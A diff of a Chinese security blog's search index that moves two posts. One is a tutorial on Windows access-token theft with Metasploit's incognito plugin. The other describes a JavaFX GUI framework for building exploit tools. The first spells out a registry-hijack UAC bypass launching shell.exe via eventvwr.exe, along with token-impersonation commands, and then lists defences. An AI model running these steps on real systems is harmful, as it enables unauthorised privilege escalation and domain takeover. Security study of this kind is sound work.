@@ -1332,86 +1332,6 @@
       </tags>
   </entry>
   <entry>
-    <title>令牌窃取分析及防范</title>
-    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
-    <content><![CDATA[<blockquote>
-<p>  快过年了，小伙伴们提议出去浪一下，决定要去玩恐怖类密室逃脱，瑟瑟发抖o((⊙﹏⊙))o.</p>
-</blockquote>
-<h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><h2 id="0x01-令牌概述"><a href="#0x01-令牌概述" class="headerlink" title="0x01 令牌概述"></a>0x01 令牌概述</h2><p>令牌( Token )是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中(除非系统重新启动)。</p>
-<p>令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。令牌一般分为以下几种：</p>
-<ul>
-<li>访问令牌(Access Token) 代表访问控制操作主体的系统对象。(本文主要讲Windows的AccessToken)</li>
-<li>密保令牌(Security Token) 也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</li>
-<li>会话令牌 ( SessionToken)是交互会话中唯一的身份标识符。</li>
-</ul>
-<h4 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h4><p>Windows 访问令牌(Access Tokens) 是一个描述进程或线程安全上下文的对象。令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p>
-<p>目前访问令牌分为两种令牌：</p>
-<ul>
-<li>主令牌（每一个进程都具有一个唯一的主令牌，进程通过主令牌被开启）</li>
-<li>模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
-</ul>
-<p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。主令牌和模拟令牌，都会在系统重启或者关机后全部清除。</p>
-<p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p>
-<ul>
-<li>用户帐户的安全标识符(SID)</li>
-<li>用户帐户所属的用户群的SIDs</li>
-<li>一个logon SID，标识当前登录会话</li>
-<li>用户或用户群的特权清单</li>
-<li>所有者的SID</li>
-<li>基本群的SID</li>
-<li>当用户创建可安全对象（securable object）且没有给出安全描述符时，系统使用的缺省的自主访问控制列表（DACL）</li>
-<li>访问令牌资源</li>
-<li>是否为primary或impersonation token</li>
-<li>限制性SIDs的可选列表</li>
-<li>当前impersonation级别</li>
-<li>其他统计</li>
-</ul>
-<p>攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。</p>
-<p>攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。</p>
-<p>攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p>
-<p><strong>列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。</strong></p>
-<h2 id="0x02-令牌窃取"><a href="#0x02-令牌窃取" class="headerlink" title="0x02 令牌窃取"></a>0x02 令牌窃取</h2><h5 id="使用MSF中的-incognito-插件"><a href="#使用MSF中的-incognito-插件" class="headerlink" title="使用MSF中的 incognito 插件"></a>使用MSF中的 incognito 插件</h5><p>由于我当前的权限是一个普通用户，所以令牌窃取只能窃取到当前用户本身</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085126.png" alt="image-20210129091617259"></p>
-<p>利用上一节<strong>Windows提权-BypassUAC之劫持注册表实验</strong> ，使用UAC提权，先另起一个MSF监听，然后在本sessoin中的shell中执行</p>
-<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d c:\testftp\<span class="keyword">shell</span>.exe /f</span><br><span class="line"></span><br><span class="line">eventvwr.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085131.png" alt="image-20210128223604660"></p>
-<blockquote>
-<p>  Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</p>
-<p>   Impresonation Token：模拟令牌，它是非交互的会话。</p>
-</blockquote>
-<p>得到授权令牌：		</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line">TEST\yhy</span><br></pre></td></tr></table></figure>
-
-<p>得到模拟令牌：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
-
-<p>伪造授权令牌，就可以拥有它的权限了，使用下面命令获取对应token的权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impersonate_token &#x27;TEST\Administrator&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085137.png" alt="image-20210128223730735"></p>
-<p>使用<code>drop_token</code>返回之前的token，和 <code>rev2self</code> 一样</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085141.png" alt="image-20210128223804482"></p>
-<p>Windows 访问令牌是用户登录后分配的用于标识用户权限的对象，通过复制令牌，我们可以摸拟该令牌代表的用户。典型的用法是获取 SYSTEM 权限，以及查看本机是否有域控账号的令牌，然后窃取该令牌，从而控制整个域。</p>
-<h2 id="0x03-令牌窃取提权的防御措施"><a href="#0x03-令牌窃取提权的防御措施" class="headerlink" title="0x03 令牌窃取提权的防御措施"></a>0x03 令牌窃取提权的防御措施</h2><p>针对令牌窃取提权的防御措施如下：</p>
-<ul>
-<li>为了防止域管理员的令牌被窃取，应该禁止域管理员登录其它主机。如果登录了，使用完后应该及时重启电脑，从而把令牌清除。</li>
-<li>及时安装微软推送的补丁</li>
-<li>对于来路不明的或者危险的软件，既不要在系统中使用，也不要在虚拟机中使用</li>
-<li>对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息</li>
-<li>对于令牌，应采取加密存储及多长验证保护</li>
-<li>使用加密链路SSL&#x2F;TLS传输令牌，以防止被中间人窃听</li>
-</ul>
-]]></content>
-      <categories>
-        <category>域渗透</category>
-      </categories>
-      <tags>
-        <tag>Windows提权</tag>
-        <tag>域渗透</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqlmap关于os-shell小记</title>
     <url>/2020/11/06/sqlmap%E5%85%B3%E4%BA%8Eos-shell%E5%B0%8F%E8%AE%B0/</url>
     <content><![CDATA[<h1 id="SqlMap-–os-shell-利用"><a href="#SqlMap-–os-shell-利用" class="headerlink" title="SqlMap –os-shell 利用"></a>SqlMap –os-shell 利用</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><ol>
@@ -1622,6 +1542,86 @@
       </tags>
   </entry>
   <entry>
+    <title>令牌窃取分析及防范</title>
+    <url>/2021/01/29/%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E5%88%86%E6%9E%90%E5%8F%8A%E9%98%B2%E8%8C%83/</url>
+    <content><![CDATA[<blockquote>
+<p>  快过年了，小伙伴们提议出去浪一下，决定要去玩恐怖类密室逃脱，瑟瑟发抖o((⊙﹏⊙))o.</p>
+</blockquote>
+<h2 id="令牌窃取分析及防范"><a href="#令牌窃取分析及防范" class="headerlink" title="令牌窃取分析及防范"></a>令牌窃取分析及防范</h2><h2 id="0x01-令牌概述"><a href="#0x01-令牌概述" class="headerlink" title="0x01 令牌概述"></a>0x01 令牌概述</h2><p>令牌( Token )是指系统中的临时密钥，相当于账户和密码，用于决定是否允许当前请求及判断当前请求是属于哪个用户的。获得了令牌，就可以在不提供密码或其他凭证的情况下访问网络和系统资源。这些令牌将持续存在于系统中(除非系统重新启动)。</p>
+<p>令牌的最大特点是随机性和不可预测性，一般的攻击者或软件都无法将令牌猜测出来。令牌一般分为以下几种：</p>
+<ul>
+<li>访问令牌(Access Token) 代表访问控制操作主体的系统对象。(本文主要讲Windows的AccessToken)</li>
+<li>密保令牌(Security Token) 也叫作认证令牌或者硬件令牌，是一种用于实现计算机身份校验的物理设备，例如U盾。</li>
+<li>会话令牌 ( SessionToken)是交互会话中唯一的身份标识符。</li>
+</ul>
+<h4 id="Windows访问令牌"><a href="#Windows访问令牌" class="headerlink" title="Windows访问令牌"></a>Windows访问令牌</h4><p>Windows 访问令牌(Access Tokens) 是一个描述进程或线程安全上下文的对象。令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登录时，系统通过将用户输入的密码与储存在安全数据库中的密码进行对比。若密码正确，系统将生成一个访问令牌。之后，该用户执行的每个进程都会拥有一个该访问令牌的副本。</p>
+<p>目前访问令牌分为两种令牌：</p>
+<ul>
+<li>主令牌（每一个进程都具有一个唯一的主令牌，进程通过主令牌被开启）</li>
+<li>模拟令牌（在默认的情况下，当线程被开启的时候，所在进程的主令牌会自动附加到当前线程上，作为线程的安全上下文。而线程可以运行在另一个非主令牌的访问令牌下执行，而这个令牌被称为模拟令牌。而指定线程的模拟令牌的过程被称为模拟）</li>
+</ul>
+<p>主令牌是与进程相关的；模拟的令牌是与模拟令牌的线程相关的。主令牌和模拟令牌，都会在系统重启或者关机后全部清除。</p>
+<p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。访问令牌包含以下信息：</p>
+<ul>
+<li>用户帐户的安全标识符(SID)</li>
+<li>用户帐户所属的用户群的SIDs</li>
+<li>一个logon SID，标识当前登录会话</li>
+<li>用户或用户群的特权清单</li>
+<li>所有者的SID</li>
+<li>基本群的SID</li>
+<li>当用户创建可安全对象（securable object）且没有给出安全描述符时，系统使用的缺省的自主访问控制列表（DACL）</li>
+<li>访问令牌资源</li>
+<li>是否为primary或impersonation token</li>
+<li>限制性SIDs的可选列表</li>
+<li>当前impersonation级别</li>
+<li>其他统计</li>
+</ul>
+<p>攻击者可以使用访问令牌在不同的用户或系统安全性上下文下进行操作，以执行操作并逃避检测。</p>
+<p>攻击者可以使用内置的Windows API函数来复制现有进程中的访问令牌。这被称为令牌窃取。</p>
+<p>攻击者必须已经在特权用户上下文（即管理员）中才能窃取令牌。攻击者通常使用令牌窃取将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户对远程系统具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p>
+<p><strong>列举令牌只能列出当前用户和比当前用户权限更低用户的令牌，例如当前权限是system或者是administrator，那么我们就可以看到系统中所有的令牌。</strong></p>
+<h2 id="0x02-令牌窃取"><a href="#0x02-令牌窃取" class="headerlink" title="0x02 令牌窃取"></a>0x02 令牌窃取</h2><h5 id="使用MSF中的-incognito-插件"><a href="#使用MSF中的-incognito-插件" class="headerlink" title="使用MSF中的 incognito 插件"></a>使用MSF中的 incognito 插件</h5><p>由于我当前的权限是一个普通用户，所以令牌窃取只能窃取到当前用户本身</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085126.png" alt="image-20210129091617259"></p>
+<p>利用上一节<strong>Windows提权-BypassUAC之劫持注册表实验</strong> ，使用UAC提权，先另起一个MSF监听，然后在本sessoin中的shell中执行</p>
+<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKCU\Software\Classes\mscfile\shell\open\command&quot;</span> /d c:\testftp\<span class="keyword">shell</span>.exe /f</span><br><span class="line"></span><br><span class="line">eventvwr.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085131.png" alt="image-20210128223604660"></p>
+<blockquote>
+<p>  Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)</p>
+<p>   Impresonation Token：模拟令牌，它是非交互的会话。</p>
+</blockquote>
+<p>得到授权令牌：		</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line">TEST\yhy</span><br></pre></td></tr></table></figure>
+
+<p>得到模拟令牌：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>
+
+<p>伪造授权令牌，就可以拥有它的权限了，使用下面命令获取对应token的权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impersonate_token &#x27;TEST\Administrator&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085137.png" alt="image-20210128223730735"></p>
+<p>使用<code>drop_token</code>返回之前的token，和 <code>rev2self</code> 一样</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085141.png" alt="image-20210128223804482"></p>
+<p>Windows 访问令牌是用户登录后分配的用于标识用户权限的对象，通过复制令牌，我们可以摸拟该令牌代表的用户。典型的用法是获取 SYSTEM 权限，以及查看本机是否有域控账号的令牌，然后窃取该令牌，从而控制整个域。</p>
+<h2 id="0x03-令牌窃取提权的防御措施"><a href="#0x03-令牌窃取提权的防御措施" class="headerlink" title="0x03 令牌窃取提权的防御措施"></a>0x03 令牌窃取提权的防御措施</h2><p>针对令牌窃取提权的防御措施如下：</p>
+<ul>
+<li>为了防止域管理员的令牌被窃取，应该禁止域管理员登录其它主机。如果登录了，使用完后应该及时重启电脑，从而把令牌清除。</li>
+<li>及时安装微软推送的补丁</li>
+<li>对于来路不明的或者危险的软件，既不要在系统中使用，也不要在虚拟机中使用</li>
+<li>对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息</li>
+<li>对于令牌，应采取加密存储及多长验证保护</li>
+<li>使用加密链路SSL&#x2F;TLS传输令牌，以防止被中间人窃听</li>
+</ul>
+]]></content>
+      <categories>
+        <category>域渗透</category>
+      </categories>
+      <tags>
+        <tag>Windows提权</tag>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>初探Java反序列化漏洞(一)</title>
     <url>/2021/04/16/%E5%88%9D%E6%8E%A2Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E4%B8%80)/</url>
     <content><![CDATA[<blockquote>
@@ -1815,57 +1815,6 @@
       </tags>
   </entry>
   <entry>
-    <title>图形化漏洞利用Demo-JavaFX版</title>
-    <url>/2021/03/23/%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Demo-JavaFX%E7%89%88/</url>
-    <content><![CDATA[<h2 id="0x01-这是个嘛？"><a href="#0x01-这是个嘛？" class="headerlink" title="0x01 这是个嘛？"></a>0x01 这是个嘛？</h2><p>这是一个构建图形化漏洞利用的一个项目，已经写好架子，只需要往里填充exp即可，帮助安全人员快速构建一个图形化的、跨平台的漏洞利用工具。</p>
-<p>虽然有很多优秀的命令行利用工具，但我觉得还是带界面的方便、直观。</p>
-<p>使用本项目，你不需要懂太多Java语言，只需要了解基本的语法，参考自带的EXP例子，即可快速开发一款<strong>属于你自己</strong>的漏洞利用工具，建立自己的漏洞利用库。</p>
-<p><a href="https://mp.weixin.qq.com/s/j5BHSbNZ76XbSZp6hFj9fw">ExpDemo-JavaFX工具新增漏洞编写教程</a></p>
-<h2 id="0x02-Demo"><a href="#0x02-Demo" class="headerlink" title="0x02 Demo"></a>0x02 Demo</h2><p>经过多次改版，这是最终(?)的效果。详细见<a href="https://github.com/yhy0/ExpDemo-JavaFX/blob/master/%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95.md">更新记录.md</a></p>
-<p><a href="https://user-images.githubusercontent.com/31311038/129846212-c0a50a7d-0890-4fdf-909e-000981246e3b.mp4">https://user-images.githubusercontent.com/31311038/129846212-c0a50a7d-0890-4fdf-909e-000981246e3b.mp4</a></p>
-<video controls="controls" loop="loop" autoplay="autoplay" width="100%"> 
-    <source src="/img/SJ.mp4" type="video/mp4">
-</video>
-
-<h2 id="0x03-编写属于你的图像化漏洞利用工具"><a href="#0x03-编写属于你的图像化漏洞利用工具" class="headerlink" title="0x03 编写属于你的图像化漏洞利用工具"></a>0x03 编写属于你的图像化漏洞利用工具</h2><h4 id="3-1-项目结构"><a href="#3-1-项目结构" class="headerlink" title="3.1 项目结构"></a>3.1 项目结构</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── ExpDemo-JavaFX.iml</span><br><span class="line">├── logs          运行日志文件</span><br><span class="line">│   ├── debug.log</span><br><span class="line">│   └── error.log</span><br><span class="line">├── pom.xml</span><br><span class="line">└── src</span><br><span class="line">    └── main</span><br><span class="line">        ├── java</span><br><span class="line">        │   └── fun</span><br><span class="line">        │       └── fireline</span><br><span class="line">        │           ├── AppStartUp.java    应用程序启动入口</span><br><span class="line">        │           ├── controller    控制JavaFX图形化界面的各种显示、事件等，核心代码 </span><br><span class="line">        │           │   ├── MainController.java  主界面的controller，负责切换界面和基本信息显示</span><br><span class="line">        │           │   ├── OAController.java   OA漏洞利用切换界面的相关逻辑</span><br><span class="line">        │           │   ├── OthersController.java  其他漏洞界面的相关逻辑</span><br><span class="line">        │           │   ├── Struts2Controller.java  Struts2漏洞利用界面的相关逻辑</span><br><span class="line">        │           │   └── oa      OA漏洞利用的相关逻辑</span><br><span class="line">        │           │       └── OASeeyonController.java</span><br><span class="line">        │           ├── core     核心代码文件夹</span><br><span class="line">        │           │   ├── Constants.java   一些常量基本信息</span><br><span class="line">        │           │   ├── ExploitInterface.java   exp 编写要实现的接口</span><br><span class="line">        │           │   ├── Job.java    一种漏洞全部检查的类</span><br><span class="line">        │           │   └── VulInfo.java</span><br><span class="line">        │           ├── exp			各种 exp 实现类</span><br><span class="line">        │           │   ├── apache</span><br><span class="line">        │           │   │   └── struts2</span><br><span class="line">        │           │   │       ├── S2_005.java</span><br><span class="line">        │           │   │       ├── S2_009.java</span><br><span class="line">        │           │   │       ├── S2_016.java</span><br><span class="line">        │           │   │       ├── S2_019.java</span><br><span class="line">        │           │   │       ├── S2_032.java</span><br><span class="line">        │           │   │       ├── S2_045.java</span><br><span class="line">        │           │   │       ├── S2_046.java</span><br><span class="line">        │           │   │       └── S2_DevMode.java</span><br><span class="line">        │           │   ├── cms</span><br><span class="line">        │           │   │   └── nc</span><br><span class="line">        │           │   │       └── CNVD_2021_30167.java</span><br><span class="line">        │           │   ├── oracle</span><br><span class="line">        │           │   │   └── CVE_2020_14882.java</span><br><span class="line">        │           │   └── others</span><br><span class="line">        │           │       └── CVE_2021_22986.java</span><br><span class="line">        │           └── tools  工具文件夹</span><br><span class="line">        │               ├── HttpTool.java  HTTP 请求封装</span><br><span class="line">        │               ├── MyCERT.java    HTTPS 请求证书设置</span><br><span class="line">        │               └── Tools.java     一些处理函数</span><br><span class="line">        └── resources    资源文件夹</span><br><span class="line">            ├── css      界面css样式表</span><br><span class="line">            │   └── main.css</span><br><span class="line">            ├── fxml    界面的设计文件</span><br><span class="line">            │   ├── Main.fxml</span><br><span class="line">            │   ├── OA.fxml</span><br><span class="line">            │   ├── Others.fxml</span><br><span class="line">            │   ├── Struts2.fxml</span><br><span class="line">            │   ├── Weblogic.fxml</span><br><span class="line">            │   └── oa</span><br><span class="line">            │       ├── OA-E-office.fxml</span><br><span class="line">            │       ├── OA-Kingdee.fxml</span><br><span class="line">            │       ├── OA-Landray.fxml</span><br><span class="line">            │       └── OA-Seeyon.fxml</span><br><span class="line">            ├── img</span><br><span class="line">            │   ├── sec.png</span><br><span class="line">            │   └── weixin.jpg</span><br><span class="line">            └── log4j.properties   日志相关设置</span><br></pre></td></tr></table></figure>
-
-<h4 id="3-2-编写EXP"><a href="#3-2-编写EXP" class="headerlink" title="3.2 编写EXP"></a>3.2 编写EXP</h4><p>编写EXP时，要使用 <code>implements</code>实现<code>ExploitInterface</code>接口，实现接口中的几个方法</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133114.png" alt="image-20210327190517731"></p>
-<ul>
-<li>checkVUL		使用poc 检查是否漏洞</li>
-<li>exeCMD          使用exp执行命令</li>
-<li>uploadFile        使用命令执行 写webshell，上传文件</li>
-<li>getWebPath     获取网站的web目录，供上传文件使用</li>
-<li>isVul                是否存在漏洞，检查时会根据结构自动赋值，供后续调用</li>
-</ul>
-<p>EXP具体编写请参考 <code>fun/fireline/exp</code> 下的各种漏洞实现</p>
-<p>当编写完EXP后，转到 <code>fun/fireline/controller</code> 下对应的<strong>xxController.java</strong>文件，比如新编写了Struts2的相关漏洞，修改<strong>Struts2Controller.java</strong>的<strong>STRUTS2</strong>变量，新加入一个漏洞名称，这里对应的是图像化界面中可供选择的漏洞列表</p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133131.png" alt="image-20210818125816864"></p>
-<p>之后进入和 <code>fun/fireline/tools/Tools.java</code> 的<strong>getExploit</strong>方法中新增一个<strong>else if</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/JavaFX/20210818133137.png" alt="image-20210818130128550"></p>
-<p>编写完后，可以直接执行<code>fun/fireline/AppStartUp.java</code>类, 查看是否正常运行。</p>
-<p>开发过程中每次修改完运行前，最好将生成的<strong>target</strong>目录删除再运行</p>
-<h4 id="3-3-新增漏洞页面"><a href="#3-3-新增漏洞页面" class="headerlink" title="3.3 新增漏洞页面"></a>3.3 新增漏洞页面</h4><p>具体请看<a href="https://github.com/yhy0/ExpDemo-JavaFX/blob/master/%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95.md">更新记录.md</a></p>
-<p><a href="https://mp.weixin.qq.com/s/j5BHSbNZ76XbSZp6hFj9fw">ExpDemo-JavaFX工具新增漏洞编写教程</a></p>
-<h4 id="3-4-部署，发布"><a href="#3-4-部署，发布" class="headerlink" title="3.4 部署，发布"></a>3.4 部署，发布</h4><p>当一切编写完成，bug修复完毕，在项目根目录下执行 <strong>mvn package assembly:single</strong> 即可生成 <strong>jar</strong> 文件。</p>
-<p>运行使用<strong>target目录下最大的jar文件</strong> </p>
-<p>对方没有Java环境怎么办？</p>
-<p>使用 <strong>mvn jfx:native</strong> 命令生产对应平台的文件，比如Mac下，执行命令<strong>mvn jfx:native</strong>命令就会在 <strong>target&#x2F;jfx&#x2F;native</strong> 目录下生成打包后应用(win下生成exe)，带可执行文件，带 JRE 运行环境，超大，200+M。</p>
-<p> <strong>mvn clean</strong>用于清除生成的文件。</p>
-<h2 id="0x05-免责声明"><a href="#0x05-免责声明" class="headerlink" title="0x05 免责声明"></a>0x05 免责声明</h2><p>本工具仅能在取得足够合法授权的企业安全建设中使用，在使用本工具过程中，您应确保自己所有行为符合当地的法律法规。</p>
-<p>如您在使用本工具的过程中存在任何非法行为，您将自行承担所有后果，本工具所有开发者和所有贡献者不承担任何法律及连带责任。</p>
-<p>除非您已充分阅读、完全理解并接受本协议所有条款，否则，请您不要安装并使用本工具。</p>
-<p>您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p>
-<h2 id="开心指数"><a href="#开心指数" class="headerlink" title="开心指数"></a>开心指数</h2><p><a href="https://starchart.cc/yhy0/ExpDemo-JavaFX"><img src="https://starchart.cc/yhy0/ExpDemo-JavaFX.svg" alt="Stargazers over time"></a></p>
-]]></content>
-      <categories>
-        <category>开源工具</category>
-      </categories>
-      <tags>
-        <tag>开源工具</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>域渗透-DCSync和黄金票据</title>
     <url>/2021/02/21/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/</url>
     <content><![CDATA[<blockquote>
@@ -1922,6 +1871,57 @@
       <tags>
         <tag>Windows提权</tag>
         <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>图形化漏洞利用Demo-JavaFX版</title>
+    <url>/2021/03/23/%E5%9B%BE%E5%BD%A2%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8Demo-JavaFX%E7%89%88/</url>
+    <content><![CDATA[<h2 id="0x01-这是个嘛？"><a href="#0x01-这是个嘛？" class="headerlink" title="0x01 这是个嘛？"></a>0x01 这是个嘛？</h2><p>这是一个构建图形化漏洞利用的一个项目，已经写好架子，只需要往里填充exp即可，帮助安全人员快速构建一个图形化的、跨平台的漏洞利用工具。</p>
+<p>虽然有很多优秀的命令行利用工具，但我觉得还是带界面的方便、直观。</p>
+<p>使用本项目，你不需要懂太多Java语言，只需要了解基本的语法，参考自带的EXP例子，即可快速开发一款<strong>属于你自己</strong>的漏洞利用工具，建立自己的漏洞利用库。</p>
+<p><a href="https://mp.weixin.qq.com/s/j5BHSbNZ76XbSZp6hFj9fw">ExpDemo-JavaFX工具新增漏洞编写教程</a></p>
+<h2 id="0x02-Demo"><a href="#0x02-Demo" class="headerlink" title="0x02 Demo"></a>0x02 Demo</h2><p>经过多次改版，这是最终(?)的效果。详细见<a href="https://github.com/yhy0/ExpDemo-JavaFX/blob/master/%E6%9B%B4%E6%96%B0%E8%AE%B0%E5%BD%95.md">更新记录.md</a></p>
+<p><a href="https://user-images.githubusercontent.com/31311038/129846212-c0a50a7d-0890-4fdf-909e-000981246e3b.mp4">https://user-images.githubusercontent.com/31311038/129846212-c0a50a7d-0890-4fdf-909e-000981246e3b.mp4</a></p>
+<video controls="controls" loop="loop" autoplay="autoplay" width="100%"> 
+    <source src="/img/SJ.mp4" type="video/mp4">
+</video>
+
+<h2 id="0x03-编写属于你的图像化漏洞利用工具"><a href="#0x03-编写属于你的图像化漏洞利用工具" class="headerlink" title="0x03 编写属于你的图像化漏洞利用工具"></a>0x03 编写属于你的图像化漏洞利用工具</h2><h4 id="3-1-项目结构"><a href="#3-1-项目结构" class="headerlink" title="3.1 项目结构"></a>3.1 项目结构</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── ExpDemo-JavaFX.iml</span><br><span class="line">├── logs          运行日志文件</span><br><span class="line">│   ├── debug.log</span><br><span class="line">│   └── error.log</span><br><span class="line">├── pom.xml</span><br><span class="line">└── src</span><br><span class="line">    └── main</span><br><span class="line">        ├── java</span><br><span class="line">        │   └── fun</span><br><span class="line">        │       └── fireline</span><br><span class="line">        │           ├── AppStartUp.java    应用程序启动入口</span><br><span class="line">        │           ├── controller    控制JavaFX图形化界面的各种显示、事件等，核心代码 </span><br><span class="line">        │           │   ├── MainController.java  主界面的controller，负责切换界面和基本信息显示</span><br><span class="line">        │           │   ├── OAController.java   OA漏洞利用切换界面的相关逻辑</span><br><span class="line">        │           │   ├── OthersController.java  其他漏洞界面的相关逻辑</span><br><span class="line">        │           │   ├── Struts2Controller.java  Struts2漏洞利用界面的相关逻辑</span><br><span class="line">        │           │   └── oa      OA漏洞利用的相关逻辑</span><br><span class="line">        │           │       └── OASeeyonController.java</span><br><span class="line">        │           ├── core     核心代码文件夹</span><br><span class="line">        │           │   ├── Constants.java   一些常量基本信息</span><br><span class="line">        │           │   ├── ExploitInterface.java   exp 编写要实现的接口</span><br><span class="line">        │           │   ├── Job.java    一种漏洞全部检查的类</span><br><span class="line">        │           │   └── VulInfo.java</span><br><span class="line">        │           ├── exp			各种 exp 实现类</span><br><span class="line">        │           │   ├── apache</span><br><span class="line">        │           │   │   └── struts2</span><br><span class="line">        │           │   │       ├── S2_005.java</span><br><span class="line">        │           │   │       ├── S2_009.java</span><br><span class="line">        │           │   │       ├── S2_016.java</span><br><span class="line">        │           │   │       ├── S2_019.java</span><br><span class="line">        │           │   │       ├── S2_032.java</span><br><span class="line">        │           │   │       ├── S2_045.java</span><br><span class="line">        │           │   │       ├── S2_046.java</span><br><span class="line">        │           │   │       └── S2_DevMode.java</span><br><span class="line">        │           │   ├── cms</span><br><span class="line">        │           │   │   └── nc</span><br><span class="line">        │           │   │       └── CNVD_2021_30167.java</span><br><span class="line">        │           │   ├── oracle</span><br><span class="line">        │           │   │   └── CVE_2020_14882.java</span><br><span class="line">        │           │   └── others</span><br><span class="line">        │           │       └── CVE_2021_22986.java</span><br><span class="line">        │           └── tools  工具文件夹</span><br><span class="line">        │               ├── HttpTool.java  HTTP 请求封装</span><br><span class="line">        │               ├── MyCERT.java    